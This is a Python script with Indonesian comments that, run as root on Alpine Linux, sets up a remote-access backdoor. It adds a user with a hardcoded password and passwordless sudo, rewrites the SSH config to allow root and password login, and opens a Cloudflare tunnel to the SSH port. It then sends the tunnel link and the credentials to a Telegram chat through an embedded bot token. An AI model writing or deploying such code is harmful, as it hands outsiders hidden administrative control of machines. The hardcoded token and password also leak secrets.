import subprocess
import time
import re
import os
import shutil
import sys
import urllib.request
import urllib.parse
import ssl

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

# Bypass SSL Verification untuk Alpine yang tidak punya CA-Certificates
ssl_ctx = ssl._create_unverified_context()

def run_cmd(cmd):
    try:
        # Gunakan shell=True dan paksa PATH agar perintah ditemukan
        my_env = os.environ.copy()
        my_env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        subprocess.run(cmd, shell=True, check=True, env=my_env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def setup_alpine_ssh():
    # Pastikan package dasar ada
    run_cmd("apk update && apk add --no-cache openssh sudo wget coreutils shadow ca-certificates")

    # Setup User
    run_cmd(f"userdel -r {USER_SSH} 2>/dev/null")
    run_cmd(f"adduser -D -s /bin/sh {USER_SSH}")
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # Sudoers
    run_cmd("mkdir -p /etc/sudoers.d")
    with open(f"/etc/sudoers.d/{USER_SSH}", "w") as f:
        f.write(f"{USER_SSH} ALL=(ALL) NOPASSWD: ALL")
    run_cmd(f"chmod 0440 /etc/sudoers.d/{USER_SSH}")

    # SSHD Setup
    run_cmd("ssh-keygen -A")
    ssh_config = f"Port {SSH_PORT}\nPasswordAuthentication yes\nPermitRootLogin yes\n"
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    # Bunuh sshd lama jika ada dan jalankan yang baru
    run_cmd("pkill sshd")
    run_cmd("/usr/sbin/sshd")

def check_cloudflared():
    target = "/usr/local/bin/cloudflared"
    if not shutil.which("cloudflared"):
        # Gunakan link statis amd64 (bekerja baik di musl/alpine)
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget --no-check-certificate {url} -O {target}")
        run_cmd(f"chmod +x {target}")

def start_tunnel():
    run_cmd("pkill -9 cloudflared")
    if os.path.exists(LOG_FILE): os.remove(LOG_FILE)

    # Jalankan tunnel
    cmd = f"nohup cloudflared tunnel --no-autoupdate --url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    subprocess.Popen(cmd, shell=True)

    # Cari URL
    for _ in range(20): # Tunggu max 40 detik
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                content = f.read()
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', content)
                if match:
                    send_telegram(match.group(0))
                    return
        time.sleep(2)

def send_telegram(url):
    params = {
        'chat_id': CHAT_ID,
        'text': f"🏔️ **ALPINE READY**\nUser: `{USER_SSH}`\nPass: `{PASS_SSH}`\nLink: `{url}`",
        'parse_mode': 'Markdown'
    }
    encoded = urllib.parse.urlencode(params)
    api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?{encoded}"
    try:
        # Gunakan context SSL yang di-bypass
        urllib.request.urlopen(api_url, timeout=10, context=ssl_ctx)
    except:
        pass

if __name__ == "__main__":
    if os.getuid() != 0: sys.exit(1)
    setup_alpine_ssh()
    check_cloudflared()
    start_tunnel()
